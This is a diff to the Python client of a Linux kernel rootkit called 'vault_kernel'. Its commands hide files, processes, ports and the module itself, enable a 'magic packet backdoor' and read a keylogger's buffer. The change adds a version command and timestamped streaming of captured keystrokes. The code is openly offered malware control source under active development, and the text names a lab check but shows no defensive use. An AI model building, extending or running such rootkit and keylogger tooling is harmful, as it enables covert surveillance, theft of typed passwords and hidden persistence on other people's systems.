@@ -26,6 +26,7 @@ Commands:
     unhide-module         Make rootkit visible in lsmod
     reset                 Clear ALL hidden files, PIDs and ports
     status                Check if rootkit is loaded and show info
+    version               Print client version and ioctl ABI constants
     doctor [--json]       Diagnose module/client state (lab sanity check)
 """
 
@@ -42,7 +43,7 @@ import argparse
 MAGIC = 0xC0
 DEVICE_PATH = "/dev/vault_kernel"
 SYSFS_MODULE = "/sys/module/vault_kernel"
-CLIENT_VERSION = "3.7"
+CLIENT_VERSION = "3.8"
 
 
 def _port_arg(value):
@@ -109,6 +110,13 @@ WATCH_DEFAULT_INTERVAL_MS = 1000
 JSON_SCHEMA_VERSION = 1
 
 
+def format_version_line():
+    """The `version` command's exact output line — mirrors printVersion()
+    in the Go client (client/go/cmd/vault_kernel/main.go)."""
+    return (f"vault_kernel CLI v{CLIENT_VERSION} "
+            f"(ioctl magic 0x{MAGIC:02X}, signal trigger {MAGIC_SIGNAL})")
+
+
 def _interval_ms_to_seconds(ms):
     """Convert a documented-MILLISECONDS --interval into the seconds
     time.sleep() expects, clamped to the 50 ms floor.  v3.5 slept the
@@ -135,6 +143,26 @@ def _ms_arg(value):
         raise argparse.ArgumentTypeError(
             f"interval must not be negative, got {iv}")
     return iv
+
+
+def format_keylog_event(new_text, ts=None, wrapped=False):
+    """Format one `keylog --follow` event — mirrors formatKeylogEvent()
+    in the Go client (contract pinned by tests in BOTH clients).
+
+    new_text is the new content of this poll: the suffix diff when the
+    buffer grew by appending, or the full report when it wrapped.  With
+    ts (the poll time, from --timestamps) every event starts on a fresh
+    line prefixed [HH:MM:SS] — the timestamp is the time of the POLL
+    that first showed these keystrokes, not the keystroke itself (the
+    module's buffer carries no per-keystroke time).  Without ts the
+    historical behaviour is kept: suffix continues the line, a wrap
+    starts a new one.
+    """
+    if ts is not None:
+        return f"\n[{ts}] {new_text}"
+    if wrapped:
+        return "\n" + new_text
+    return new_text
 
 
 def fnv1a16(word: str) -> int:
@@ -543,12 +571,14 @@ class VaultKernelClient:
             print(f"[+] Magic packet backdoor enabled: '{word}'")
         self._close()
 
-    def keylog_read(self, follow=False, interval=None):
+    def keylog_read(self, follow=False, interval=None, timestamps=False):
         """Read captured keystrokes; with follow=True, stream new
         keystrokes until Ctrl-C.  The module's buffer shifts left when
         full, so a suffix diff is printed while the common prefix
-        holds and a full replay when it wraps.  `interval` is in
-        SECONDS internally (None = documented default of 500 ms)."""
+        holds and a full replay when it wraps.  With timestamps=True
+        (follow only) each event is prefixed with the poll time — see
+        format_keylog_event.  `interval` is in SECONDS internally
+        (None = documented default of 500 ms)."""
         if interval is None:
             interval = _interval_ms_to_seconds(KEYLOG_DEFAULT_INTERVAL_MS)
         self._open()
@@ -562,9 +592,13 @@ class VaultKernelClient:
                 if cur != prev:
                     if follow:
                         if len(cur) >= len(prev) and cur.startswith(prev):
-                            print(cur[len(prev):], end='', flush=True)
+                            new_text, wrapped = cur[len(prev):], False
                         else:
-                            print("\n" + cur, end='', flush=True)
+                            new_text, wrapped = cur, True
+                        print(format_keylog_event(
+                            new_text,
+                            time.strftime("%H:%M:%S") if timestamps else None,
+                            wrapped), end='', flush=True)
                         prev = cur
                     else:
                         print(f"[*] Keystroke log:\n{cur}" if cur
@@ -749,10 +783,14 @@ def main():
     sp = subparsers.add_parser("keylog", help="Read captured keystrokes")
     sp.add_argument("--follow", action="store_true",
                     help="stream new keystrokes until Ctrl-C")
+    sp.add_argument("--timestamps", action="store_true",
+                    help="prefix each follow event with [HH:MM:SS] "
+                         "(requires --follow)")
     sp.add_argument("--interval", type=_ms_arg,
                     default=KEYLOG_DEFAULT_INTERVAL_MS, metavar="MS",
                     help="poll interval in ms for --follow (default 500, min 50)")
     subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
+    subparsers.add_parser("version", help="Print client version and ioctl ABI")
     subparsers.add_parser("hide-module", help="Hide from lsmod")
     subparsers.add_parser("unhide-module", help="Reveal in lsmod")
     subparsers.add_parser("reset", help="Clear ALL hidden files, PIDs and ports")
@@ -765,6 +803,9 @@ def main():
 
     if os.geteuid() != 0:
         print("[!] Warning: not running as root. Some commands may fail.")
+
+    if args.command == "keylog" and args.timestamps and not args.follow:
+        parser.error("--timestamps requires --follow")
 
     client = VaultKernelClient()
 
@@ -805,7 +846,8 @@ def main():
             # --interval is documented in ms (like the Go client);
             # _interval_ms_to_seconds clamps to the 50 ms floor.
             interval = _interval_ms_to_seconds(args.interval)
-            client.keylog_read(follow=args.follow, interval=interval)
+            client.keylog_read(follow=args.follow, interval=interval,
+                               timestamps=args.timestamps)
         elif args.command == "keylog-clear":
             client.keylog_clear()
         elif args.command == "hide-module":
@@ -814,6 +856,8 @@ def main():
             client.unhide_module()
         elif args.command == "reset":
             client.reset()
+        elif args.command == "version":
+            print(format_version_line())
     except Exception as e:
         print(f"[-] Error: {e}", file=sys.stderr)
         sys.exit(1)
